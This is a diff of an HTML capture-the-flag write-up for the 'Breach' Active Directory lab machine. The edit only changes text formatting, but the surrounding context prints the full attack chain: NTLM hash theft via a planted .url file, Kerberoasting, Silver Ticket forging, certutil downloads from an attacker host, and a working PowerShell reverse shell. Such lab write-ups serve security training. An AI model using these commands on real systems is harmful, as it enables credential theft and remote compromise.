@@ -84,8 +84,8 @@
     <a href="/writeups/" class="back-link">Back to all writeups</a>
     <div class="writeup-body">
       <h2 class="writeup-section-title">Machine Overview</h2>
-      <p>Breach is a Hard difficulty Windows Active Directory machine. The attack begins with anonymous SMB access and a <strong>URL file NTLM theft attack</strong> to capture credentials. After collecting LDAP data for BloodHound, a <strong>Targeted Kerberoast</strong> attack against a MSSQL service account provides further credentials. A <strong>Silver Ticket</strong> is forged to gain access to the MSSQL server, and a reverse shell is obtained through <code>xp_cmdshell</code>. Privilege escalation exploits the <strong>SeImpersonatePrivilege</strong> using <strong>GodPotato</strong> to achieve SYSTEM-level access.</p>
-      <p><strong>Note:</strong> The user flag for this box is located in a non-standard directory: <code>C:\share\transfer</code>.</p>
+      <p>Breach is a Hard difficulty Windows Active Directory machine. The attack begins with anonymous SMB access and a <code>URL file NTLM theft attack</code> to capture credentials. After collecting LDAP data for BloodHound, a <code>Targeted Kerberoast</code> attack against a MSSQL service account provides further credentials. A <code>Silver Ticket</code> is forged to gain access to the MSSQL server, and a reverse shell is obtained through <code>xp_cmdshell</code>. Privilege escalation exploits the <code>SeImpersonatePrivilege</code> using <code>GodPotato</code> to achieve SYSTEM-level access.</p>
+      <p><code>Note:</code> The user flag for this box is located in a non-standard directory: <code>C:\share\transfer</code>.</p>
       <h2 class="writeup-section-title">Initial Enumeration</h2>
       <h3 class="writeup-sub-title">Port Scanning</h3>
       <p>I begin with a full port scan to identify all open services.</p>
@@ -162,7 +162,7 @@ Host script results:
 |_  start_date: N/A</code></pre></div>
       <h2 class="writeup-section-title">Foothold: NTLM Theft via URL File</h2>
       <h3 class="writeup-sub-title">Anonymous SMB Enumeration</h3>
-      <p>With no credentials yet, I scan the SMB server using the anonymous user. The scan reveals that anonymous access has <strong>read and write permissions</strong> on a share.</p>
+      <p>With no credentials yet, I scan the SMB server using the anonymous user. The scan reveals that anonymous access has <code>read and write permissions</code> on a share.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Breach]
 └─$ smbmap -H 10.129.38.136 -u anonymous 
 [/] Enumerating shares...                                                  
@@ -184,7 +184,7 @@ Password for [WORKGROUP\anonymous]:
 Try &quot;help&quot; to get a list of possible commands.
 smb: \&gt;</code></pre></div>
       <h3 class="writeup-sub-title">URL File Attack for NTLM Hash Theft</h3>
-      <p>A <strong>URL file attack</strong> abuses Windows shortcut/URL files (.url, .website) that reference UNC paths. When a user opens or navigates to a folder containing such a file, Windows automatically attempts to authenticate to the attacker's SMB server — leaking NTLM credentials. I craft a malicious <code>.url</code> file, upload it to the transfer folder, and start <strong>Responder</strong> to capture the hash.</p>
+      <p>A <code>URL file attack</code> abuses Windows shortcut/URL files (.url, .website) that reference UNC paths. When a user opens or navigates to a folder containing such a file, Windows automatically attempts to authenticate to the attacker's SMB server — leaking NTLM credentials. I craft a malicious <code>.url</code> file, upload it to the transfer folder, and start <code>Responder</code> to capture the hash.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Breach]
 └─$ cat @test.url 
 [InternetShortcut]
@@ -202,7 +202,7 @@ putting file @test.url as \transfer\@test.url (0.9 kB/s) (average 7.2 kB/s)
 [SMB] NTLMv2-SSP Client   : 10.129.38.136
 [SMB] NTLMv2-SSP Username : BREACH\Julia.Wong
 [SMB] NTLMv2-SSP Hash     : Julia.Wong::BREACH:8aa33d32a44b2dee:BE14D830218DB685D56121B6D399E90C:01010000000000000037BBCEB483DC0140C5BD0792138C34000000000200080053004C004500560001001E00570049004E002D0047004C00520046003400380055004C004D005500460004003400570049004E002D0047004C00520046003400380055004C004D00550046002E0053004C00450056002E004C004F00430041004C000300140053004C00450056002E004C004F00430041004C000500140053004C00450056002E004C004F00430041004C00070008000037BBCEB483DC0106000400020000000800300030000000000000000100000000200000F3606FD1211B4A109903917F3DBFD212588D1367A422F5BA8C2C2E9A6B0452380A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E003100350034000000000000000000</code></pre></div>
-      <p>I save the captured NTLMv2 hash to a file and crack it using <strong>John the Ripper</strong>.</p>
+      <p>I save the captured NTLMv2 hash to a file and crack it using <code>John the Ripper</code>.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Breach]
 └─$ echo &#x27;Julia.Wong::BREACH:8aa33d32a44b2dee:BE14D830218DB685D56121B6D399E90C:01010000000000000037BBCEB483DC0140C5BD0792138C34000000000200080053004C004500560001001E00570049004E002D0047004C00520046003400380055004C004D005500460004003400570049004E002D0047004C00520046003400380055004C004D00550046002E0053004C00450056002E004C004F00430041004C000300140053004C00450056002E004C004F00430041004C000500140053004C00450056002E004C004F00430041004C00070008000037BBCEB483DC0106000400020000000800300030000000000000000100000000200000F3606FD1211B4A109903917F3DBFD212588D1367A422F5BA8C2C2E9A6B0452380A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E003100350034000000000000000000&#x27; &gt; hash
 
@@ -252,7 +252,7 @@ LDAP        10.129.38.136   389    BREACHDC         Compressing output into /hom
       <h2 class="writeup-section-title">Lateral Movement: Targeted Kerberoast & Silver Ticket</h2>
       <h3 class="writeup-sub-title">Finding Kerberoastable Accounts</h3>
       <p>In BloodHound, I check for paths from owned objects to Tier Zero but find none. However, I identify a kerberoastable service account: <code>MSSQLSvc/breachdc.breach.vl</code>.</p>
-      <p><strong>Kerberoasting</strong> is an attack where a valid domain user requests a Kerberos Service Ticket (TGS) for an SPN-registered account. The ticket is encrypted with the service account's password hash, which can be cracked offline. I use <code>targetedKerberoast.py</code> (<a href="https://github.com/ShutdownRepo/targetedKerberoast)" target="_blank" rel="noopener">https://github.com/ShutdownRepo/targetedKerberoast)</a> to retrieve the hash.</p>
+      <p><code>Kerberoasting</code> is an attack where a valid domain user requests a Kerberos Service Ticket (TGS) for an SPN-registered account. The ticket is encrypted with the service account's password hash, which can be cracked offline. I use <code>targetedKerberoast.py</code> (<a href="https://github.com/ShutdownRepo/targetedKerberoast)" target="_blank" rel="noopener">https://github.com/ShutdownRepo/targetedKerberoast)</a> to retrieve the hash.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Breach/targetedKerberoast]
 └─$ python3 targetedKerberoast.py -u julia.wong -p Computer1 -d breach.vl --dc-ip breachdc.breach.vl 
 [*] Starting kerberoast attacks
@@ -295,7 +295,7 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Breach/targetedKerberoast]
 └─$ iconv -f ASCII -t UTF-16LE &lt;(printf &#x27;Trustno1&#x27;) | openssl dgst -md4
 MD4(stdin)= 69596c7aa1e8daee17f8e78870e25a5c</code></pre></div>
-      <p>A <strong>Silver Ticket</strong> is a forged Kerberos TGS ticket that bypasses the KDC entirely. Since I know the service account's NT hash and SID, I forge a ticket granting Administrator access to the MSSQL service.</p>
+      <p>A <code>Silver Ticket</code> is a forged Kerberos TGS ticket that bypasses the KDC entirely. Since I know the service account's NT hash and SID, I forge a ticket granting Administrator access to the MSSQL service.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Breach/targetedKerberoast]
 └─$ impacket-ticketer -nthash 69596c7aa1e8daee17f8e78870e25a5c -domain-sid S-1-5-21-2330692793-3312915120-706255856  -domain breach.vl -spn MSSQLSvc/breachdc.breach.vl:1433 Christine.Bruce
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
@@ -312,7 +312,7 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*]     EncTicketPart
 [*]     EncTGSRepPart
 [*] Saving ticket in Christine.Bruce.ccache</code></pre></div>
-      <p>I authenticate to the MSSQL service using the <strong>Silver Ticket</strong> I just forged. Unlike Golden Tickets (which target the KDC), a Silver Ticket is a forged TGS (Ticket Granting Service) ticket encrypted with the service account's NT hash. Because the ticket never passes through the KDC for validation, it bypasses most logging and detection mechanisms — making it a stealthy lateral movement technique.</p>
+      <p>I authenticate to the MSSQL service using the <code>Silver Ticket</code> I just forged. Unlike Golden Tickets (which target the KDC), a Silver Ticket is a forged TGS (Ticket Granting Service) ticket encrypted with the service account's NT hash. Because the ticket never passes through the KDC for validation, it bypasses most logging and detection mechanisms — making it a stealthy lateral movement technique.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Breach/targetedKerberoast]
 └─$ mssqlclient.py -k -no-pass breachdc.breach.vl                      
 
@@ -328,7 +328,7 @@ Connection received on 10.129.38.136 54383
 
 PS C:\Windows\system32&gt;</code></pre></div>
       <h2 class="writeup-section-title">Privilege Escalation: GodPotato (SeImpersonatePrivilege)</h2>
-      <p>Checking the user's privileges reveals that <code>svc_mssql</code> has <strong>SeImpersonatePrivilege</strong> — a privilege that allows the user to impersonate any authenticated token. This is a classic escalation vector using potato attacks.</p>
+      <p>Checking the user's privileges reveals that <code>svc_mssql</code> has <code>SeImpersonatePrivilege</code> — a privilege that allows the user to impersonate any authenticated token. This is a classic escalation vector using potato attacks.</p>
       <div class="code-block"><pre><code>PS C:\Users\svc_mssql&gt; whoami /priv
 
 PRIVILEGES INFORMATION
@@ -345,13 +345,13 @@ SeImpersonatePrivilege        Impersonate a client after authentication Enabled
 SeCreateGlobalPrivilege       Create global objects                     Enabled 
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled</code></pre></div>
       <h3 class="writeup-sub-title">Uploading GodPotato</h3>
-      <p>I use <code>certutil</code> to transfer <strong>GodPotato-NET4.exe</strong> (<a href="https://github.com/BeichenDream/GodPotato/releases)" target="_blank" rel="noopener">https://github.com/BeichenDream/GodPotato/releases)</a> from my Kali machine to the target. I also prepare a PowerShell reverse shell payload.</p>
+      <p>I use <code>certutil</code> to transfer <code>GodPotato-NET4.exe</code> (<a href="https://github.com/BeichenDream/GodPotato/releases)" target="_blank" rel="noopener">https://github.com/BeichenDream/GodPotato/releases)</a> from my Kali machine to the target. I also prepare a PowerShell reverse shell payload.</p>
       <div class="code-block"><pre><code>PS C:\temp&gt; certutil -urlcache -split -f http://10.10.16.154:8000/GodPotato-NET4.exe 
 ****  Online  ****
   0000  ...
   e000
 CertUtil: -URLCache command completed successfully.</code></pre></div>
-      <p>I leverage Windows' built-in <code>certutil</code> utility as a file transfer method. While certutil is designed for certificate management, its <code>-urlcache -split -f</code> parameters can download arbitrary files from HTTP URLs — making it a popular <strong>Living Off the Land Binary (LOLBin)</strong> for transferring exploitation tools to compromised Windows machines without needing to install additional software.</p>
+      <p>I leverage Windows' built-in <code>certutil</code> utility as a file transfer method. While certutil is designed for certificate management, its <code>-urlcache -split -f</code> parameters can download arbitrary files from HTTP URLs — making it a popular <code>Living Off the Land Binary (LOLBin)</code> for transferring exploitation tools to compromised Windows machines without needing to install additional software.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Breach]
 └─$ cat rce.ps1  
 $c = New-Object System.Net.Sockets.TCPClient(&#x27;10.10.16.154&#x27;,4444);$s = $c.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $s.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sb = (iex &quot;. { $data } 2&gt;&amp;1&quot; | Out-String ); $sb2 = $sb + &#x27;#&#x27;;$seb = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($seb,0,$seb.Length);$s.Flush()};$c.Close()
@@ -362,9 +362,9 @@ PS C:\temp&gt; certutil -urlcache -split -f http://10.10.16.154:8000/rce.ps1
   019f
 CertUtil: -URLCache command completed successfully.</code></pre></div>
       <h3 class="writeup-sub-title">Executing GodPotato</h3>
-      <p>With both files uploaded, I execute GodPotato to impersonate the SYSTEM token and run the PowerShell payload. On my listener, I receive a shell with <strong>Administrator privileges</strong>.</p>
+      <p>With both files uploaded, I execute GodPotato to impersonate the SYSTEM token and run the PowerShell payload. On my listener, I receive a shell with <code>Administrator privileges</code>.</p>
       <div class="code-block"><pre><code>PS C:\temp&gt; .\GodPotato-NET4.exe -cmd &quot;powershell -file C:\Users\svc_mssql\rce.ps1&quot;</code></pre></div>
-      <p>I start a <strong>netcat</strong> listener on the specified port to catch the incoming reverse shell. Netcat (<code>nc -lvnp</code>) binds to all interfaces (<code>-l</code>), enables verbose output (<code>-v</code>), skips DNS resolution (<code>-n</code>), and listens on the specified port (<code>-p</code>). Once the exploit triggers, the target machine connects back to this listener, providing an interactive command shell.</p>
+      <p>I start a <code>netcat</code> listener on the specified port to catch the incoming reverse shell. Netcat (<code>nc -lvnp</code>) binds to all interfaces (<code>-l</code>), enables verbose output (<code>-v</code>), skips DNS resolution (<code>-n</code>), and listens on the specified port (<code>-p</code>). Once the exploit triggers, the target machine connects back to this listener, providing an interactive command shell.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Breach]
 └─$ nc -lvnp 4444
 Listening on 0.0.0.0 4444
